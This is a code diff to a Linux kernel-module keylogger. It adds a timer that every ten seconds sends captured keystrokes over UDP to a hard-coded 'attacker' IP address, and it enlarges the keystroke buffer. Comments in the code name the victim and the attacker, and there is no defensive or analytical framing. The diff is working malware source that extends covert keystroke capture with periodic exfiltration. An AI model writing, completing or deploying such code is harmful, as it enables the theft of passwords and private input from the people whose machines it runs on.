@@ -19,18 +19,29 @@
 #include <linux/if_ether.h>
 #include <linux/netpoll.h>
 
+// for timer
+#include <linux/interrupt.h>
+#include <linux/hrtimer.h>
+#include <linux/sched.h>
+
 #define DEBUG 0
 #define debug(args...) if(DEBUG) printk(KERN_INFO args)
 
-#define SRC_IP "192.168.0.111" // the victim's IP address, not important
+#define SRC_IP "0.0.0.0" // the victim's IP address, not important
 #define DEST_IP "192.168.1.37" // the attacker's IP address
 #define SRC_PORT 12345 // the victim's UDP port
 #define DEST_PORT 54321 // the attacker's UDP port
 
-#define BUF_SIZE 10
+#define EXPIRE_TIME 10 // every EXPIRE_TIME seconds, send key_buf
+
+#define BUF_SIZE 16
+
 
 static char key_buf[BUF_SIZE];
 static unsigned int key_buf_ptr;
+
+static struct hrtimer htimer;
+static ktime_t kt_periode;
 
 /* we only record ASCII characters and backspace, enter, tab, esc
  * return 1 if record the c */
@@ -200,6 +211,35 @@ int keylogger_cb(struct notifier_block *nb, unsigned long action, void *data) {
     return NOTIFY_OK;
 }
 
+/* The timer callback that will be called periodically.
+   This function will send key_buf if key_buf_ptr != 0 */
+static enum hrtimer_restart timer_function(struct hrtimer * timer)
+{
+    // send packets
+    if(key_buf_ptr != 0) {
+        printk(KERN_INFO "Timer expires and key_buf has contents\n");
+        if(send_key_buf()) {
+            printk(KERN_INFO "Sending key_buf failed!\n");
+        }
+        key_buf_ptr = 0;
+        memset(key_buf, 0, BUF_SIZE);
+    }
+
+    hrtimer_forward_now(timer, kt_periode);
+
+    return HRTIMER_RESTART;
+}
+
+
+/* timer init */
+static void timer_init(void)
+{
+    kt_periode = ktime_set(EXPIRE_TIME, 0); //seconds, nanoseconds
+    hrtimer_init (& htimer, CLOCK_REALTIME, HRTIMER_MODE_REL);
+    htimer.function = timer_function;
+    hrtimer_start(& htimer, kt_periode, HRTIMER_MODE_REL);
+}
+
 /* notifier block in the notification chain*/
 static struct notifier_block nb = {
     .notifier_call = keylogger_cb,
@@ -212,14 +252,22 @@ static int keylogger_init(void)
     memset(key_buf, 0, BUF_SIZE);
     key_buf_ptr = 0;
     register_keyboard_notifier(&nb);
+    timer_init();
     //send_key_buf();// for testing
     return 0;
+}
+
+/* timer cleanup */
+static void timer_cleanup(void)
+{
+    hrtimer_cancel(& htimer);
 }
 
 /* exit function */
 static void keylogger_exit(void)
 {
     unregister_keyboard_notifier(&nb);
+    timer_cleanup();
     printk(KERN_INFO "Keylogger is unloaded!\n");
 }
 
